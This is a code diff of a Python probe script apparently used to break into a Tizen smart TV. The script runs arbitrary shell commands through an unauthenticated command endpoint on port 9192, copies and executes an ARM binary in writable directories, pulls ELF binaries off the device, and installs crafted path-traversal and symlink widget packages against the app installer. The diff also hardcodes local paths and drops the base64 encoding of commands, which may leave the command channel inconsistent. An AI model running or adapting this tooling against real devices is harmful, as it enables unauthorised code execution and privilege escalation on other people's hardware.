@@ -2,7 +2,7 @@
 """Post-wake probe matrix. Run the moment the TV (192.168.0.85) is on.
 Non-destructive: recon + exec-mmap matrix + wasutility surface + pending attack-wgt installs."""
 import sys, time, base64, subprocess
-import os as _os; sys.path.insert(0, _os.path.dirname(_os.path.abspath(__file__)))
+sys.path.insert(0, '/Users/leonb/tvroot')
 from sdblib import Sdb
 
 TV = '192.168.0.85'
@@ -10,9 +10,8 @@ APP = 'xvvl3S1bvH.TizenBrewStandalone'   # installed TizenBrew anchor (uid 5001 
 
 def tv_cmd(c, timeout=45):
     """Run command in the uid-5001 node service; returns text."""
-    b = base64.b64encode(c.encode()).decode()
     r = subprocess.run(['curl', '-s', '-G', '-m', str(timeout),
-                        'http://%s:9192/x' % TV, '--data-urlencode', 'c=' + b],
+                        'http://%s:9192/x' % TV, '--data-urlencode', 'c=' + c],
                        capture_output=True, text=True)
     return r.stdout
 
@@ -47,7 +46,7 @@ def main():
         print('== %s\n%s' % (c, tv_cmd(c)))
 
     # 3. exec-mmap matrix for our static ARM binary
-    sdb.push('/home/owner/share/tmp/sdk_tools/tvprobe', open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), 'tvprobe'), 'rb').read())
+    sdb.push('/home/owner/share/tmp/sdk_tools/tvprobe', open('/Users/leonb/tvroot/tvprobe','rb').read())
     for d in ('/run/user/5001', '/dev/shm', '/home/owner/share/tmp/sdk_tools',
               '/opt/usr/home/owner/apps_rw/xvvl3S1bvH/data'):
         c = ('cp /home/owner/share/tmp/sdk_tools/tvprobe %s/tp 2>&1; chmod 755 %s/tp 2>&1; %s/tp; echo RC=$?' % (d, d, d))
@@ -73,7 +72,7 @@ def main():
         try:
             blob = base64.b64decode(out.strip())
             if blob[:4] == b'\x7fELF':
-                open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), local), 'wb').write(blob)
+                open('/Users/leonb/tvroot/' + local, 'wb').write(blob)
                 print('== pulled %s (%d bytes)' % (local, len(blob)))
             else:
                 print('== pull %s failed: %r' % (remote, out[:120]))
@@ -84,7 +83,7 @@ def main():
     for wgt, pkgid, marks in (('wgttrav.wgt', 'leonbtrav1', ['/tmp/travA', '/tmp/travB']),
                               ('wgtsym.wgt', 'leonbsym1', ['/tmp/travC'])):
         r = '/home/owner/share/tmp/sdk_tools/' + wgt
-        sdb.push(r, open(_os.path.join(_os.path.dirname(_os.path.abspath(__file__)), wgt), 'rb').read())
+        sdb.push(r, open('/Users/leonb/tvroot/' + wgt, 'rb').read())
         out = sdb.shell('0 vd_appinstall %s ' % pkgid + r, r'spend time', 120)
         ok = 'install completed' in out
         print('== install %s: %s' % (wgt, 'OK' if ok else out.strip()[-150:]))
